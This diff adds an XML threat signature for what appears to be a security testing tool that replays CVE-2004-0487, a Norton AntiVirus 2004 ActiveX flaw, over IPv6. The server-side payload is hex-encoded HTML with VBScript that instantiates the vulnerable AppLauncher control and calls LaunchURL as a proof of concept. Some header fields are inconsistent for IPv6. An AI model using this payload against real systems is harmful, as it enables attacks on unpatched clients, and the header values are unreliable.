@@ -1,0 +1,95 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Norton Anti-Virus 2004 ActiveX DoS (IPv6 Version)"/>
+    <EngDesc display="true" value="There is a denial of service condition within an ActiveX object that is included within Norton Anti-virus 2004. An attacker can create a page that instantiates the vulnerable ActiveX object and then creates a denial of service condition on the victim computer. It has also been reported that arbitrary code can be executed on the remote client if the path of the executable is already known. (IPv6 Version)"/>
+    <Intent display="true"/>
+    <Protocol display="true" value="HTTP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Symantec"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Symantec_Symantec_Norton_Anti-virus_2004"/>
+      <item value="Symantec_Symantec_Norton_SystemWorks_2004"/>
+      <item value="Symantec_Symantec_Norton_SystemWorks_2004_Professional"/>
+      <item value="Symantec_Symantec_Norton_Anti-Virus_2004_Small_Office_Pack"/>
+      <item value="Symantec_Symantec_Norton_Internet_Security_2004_Professional_Small_Office_Pack"/>
+      <item value="Symantec_Symantec_Norton_SystemWorks_2004_Professional_Small_Office_Pack"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Symantec_Norton_Anti-virus_2004_All_versions_prior_to_v10.0.1.14"/>
+      <item value="Symantec_Norton_SystemWorks_2004_"/>
+      <item value="Symantec_Norton_SystemWorks_2004_Professional_"/>
+      <item value="Symantec_Norton_Anti-Virus_2004_Small_Office_Pack_"/>
+      <item value="Symantec_Norton_Internet_Security_2004_Professional_Small_Office_Pack_"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20040525-01"/>
+    <CVEID display="true" value="CVE-2004-0487"/>
+    <bugtraqID display="true" value="10392"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="e62d32ea061770c233860a0c716571df"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1225900399"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1213652360" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="K"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="L"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="M"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="N"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="O"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+    </for>
+    <for index="F"/>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="007DCF35" AckNumber="26BDD092" HeaderLength="05" WindowSize="4470" Checksum="C66C" UrgentPointer="0000" Options="" Payload="474554202F6E61762F6E61762E68746D6C20485454502F312E310D0A4163636570743A20696D6167652F6769662C20696D6167652F782D786269746D61702C20696D6167652F6A7065672C20696D6167652F706A7065672C206170706C69636174696F6E2F782D73686F636B776176652D666C6173682C202A2F2A0D0A4163636570742D4C616E67756167653A20656E2D63610D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520352E30313B2057696E646F7773204E5420352E303B202E4E455420434C5220312E312E34333232290D0A486F73743A2031302E322E312E36300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="26BDD092" AckNumber="007DD069" HeaderLength="05" WindowSize="1920" Checksum="0E08" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205765642C203236204D617920323030342032313A33343A343020474D540D0A5365727665723A204170616368652F322E302E3430202852656420486174204C696E7578290D0A4C6173742D4D6F6469666965643A205765642C203236204D617920323030342032313A33343A303720474D540D0A455461673A20223334613732302D3130382D6132353262316330220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203236340D0A436F6E6E656374696F6E3A20636C6F73650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D49534F2D383835392D310D0A0D0A3C68746D6C3E0D0A3C686561643E0D0A20203C736372697074206C616E67756167653D225642536372697074223E0D0A094F6E206572726F7220726573756D65206E6578740D0A09536574206C61756E63686572203D204372656174654F626A656374282253796D616E7465632E4E6F72746F6E2E416E746956697275732E4170704C61756E636865722E312229200D0A096C61756E636865722E4C61756E636855524C2022687474703A2F2F31302E322E312E3531220D0A09736574206C61756E63686572203D204E6F7468696E670D0A2020203C2F7363726970743E0D0A3C2F686561643E0D0A3C626F64793E0D0A506F430D0A3C2F626F64793E0D0A3C2F68746D6C3E0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
